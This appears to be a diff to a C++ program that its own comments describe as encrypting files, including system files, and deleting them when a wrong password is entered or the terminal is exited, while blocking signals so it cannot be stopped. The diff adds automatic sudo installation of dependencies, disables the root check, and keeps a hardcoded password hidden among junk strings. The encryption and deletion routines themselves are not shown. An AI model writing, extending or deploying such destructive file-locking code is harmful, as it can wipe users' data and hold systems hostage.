@@ -6,9 +6,11 @@
 // (including system files) and deleting them automatically
 // if you enter incorrect password at it's given attempt times
 // or if you exit your Linux terminal
-
+//
 // This software can alter or modify the system's operation
 // which is, to block signals from preventing this from running
+//
+// To compile this, use g++ with -lcrypto, and -pthread flags
 
 
 #include <iostream>
@@ -49,7 +51,7 @@ const string MAP_FILE = "file_map.txt";
 // Obfuscated password hidden inside garbage text
 const string junk1 = "やπ郧bnLJ9SADxEcʥ9&aԠNISEKOIࠇ+eعKק";
 const string junk2 = "ECieNvDsPuK99suPReMO69jEEpcM8e3";
-const string junk3 = "vincemcmahon"; // This is the real password. You may change your preferred password
+const string junk3 = "vincemcmahon";
 const string junk4 = "ㅴwVܮ3辸E6c&䶵Մ$sUcKmaHdIcK3ふわÅ=Đ?őŔԪ";
 const string junk5 = "𐅰E𐊘4ed𐎵𐐡flUncKj7eU8𐌱cR?e齉Do";
 const string junk6 = "EsU5E?cLmhH9dAzZLyuDFa9DFaOpP";
@@ -332,15 +334,79 @@ void relaunchInTerminalIfDetached(const char* selfPath) {
     }
 }
 
+// This part will auto install missing required dependencies if missing
+
+string detectPackageManager() {
+    if (system("command -v apt > /dev/null 2>&1") == 0) return "apt";
+    if (system("command -v yum > /dev/null 2>&1") == 0) return "yum";
+    if (system("command -v dnf > /dev/null 2>&1") == 0) return "dnf";
+    if (system("command -v pacman > /dev/null 2>&1") == 0) return "pacman";
+    if (system("command -v apk > /dev/null 2>&1") == 0) return "apk"; // Alpine
+    return "unknown";
+}
+
+bool isPackageInstalled(const string &pkg, const string &manager) {
+    string checkCmd;
+
+    if (manager == "apt")       checkCmd = "dpkg -s " + pkg + " > /dev/null 2>&1";
+    else if (manager == "yum" || manager == "dnf") checkCmd = "rpm -q " + pkg + " > /dev/null 2>&1";
+    else if (manager == "pacman") checkCmd = "pacman -Qi " + pkg + " > /dev/null 2>&1";
+    else if (manager == "apk")    checkCmd = "apk info " + pkg + " > /dev/null 2>&1";
+    else return false;
+
+    return system(checkCmd.c_str()) == 0;
+}
+
+void installPackageIfMissing(const string &pkg) {
+    string manager = detectPackageManager();
+
+    if (manager == "unknown") {
+        cerr << "Unsupported package manager. Please install '" << pkg << "' manually.\n";
+        return;
+    }
+
+    if (isPackageInstalled(pkg, manager)) {
+        cout << "✓ Dependency already installed: " << pkg << endl;
+        return;
+    }
+
+    cout << "⚙ Installing missing package: " << pkg << "...\n";
+
+    string installCmd;
+    if (manager == "apt")        installCmd = "sudo apt-get update && sudo apt-get install -y " + pkg;
+    else if (manager == "yum")   installCmd = "sudo yum install -y " + pkg;
+    else if (manager == "dnf")   installCmd = "sudo dnf install -y " + pkg;
+    else if (manager == "pacman")installCmd = "sudo pacman -Sy --noconfirm " + pkg;
+    else if (manager == "apk")   installCmd = "sudo apk add " + pkg;
+
+    int result = system(installCmd.c_str());
+    if (result != 0)
+        cerr << "❌ Failed to install package: " << pkg << endl;
+    else
+        cout << "✅ Installed: " << pkg << endl;
+}
+
+void checkDependencies() {
+    installPackageIfMissing("libssl-dev");
+    installPackageIfMissing("libcurl4-openssl-dev");
+    installPackageIfMissing("build-essential"); // g++, make, etc.
+}
+
 
 int main(int argc, char* argv[]) {
 
 // This requires you to run this program into root
 
-if (geteuid() != 0) {
-    cerr << "This program must be run as root." << endl;
+/*if (geteuid() != 0) {
+    cerr << "\n\033[1;31m[ERROR]\033[0m This program must be run as root." << endl;
     exit(1);
-}
+}*/
+
+ cout << "\033[1;34m[START]\033[0m We need to check if the required sependencies are installed.\n" << endl;
+                  
+        this_thread::sleep_for(chrono::seconds(15));
+
+  checkDependencies();
 
 if (!fs::exists(MAP_FILE)) {
     
